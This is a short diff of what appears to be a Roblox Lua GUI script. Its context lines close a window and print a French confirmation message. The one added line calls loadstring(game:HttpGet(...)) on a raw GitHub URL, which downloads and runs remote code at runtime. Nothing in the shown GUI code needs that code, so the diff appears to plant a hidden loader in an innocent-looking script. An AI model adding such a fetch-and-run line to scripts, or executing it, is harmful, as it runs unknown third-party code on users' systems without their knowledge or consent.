@@ -134,3 +134,5 @@ end
 closeButton.MouseButton1Click:Connect(closeGUI)
 
 print("GUI Chrome-like créé !")
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Dreammmmmm532235/source.lua/refs/heads/main/Script%20player'))()
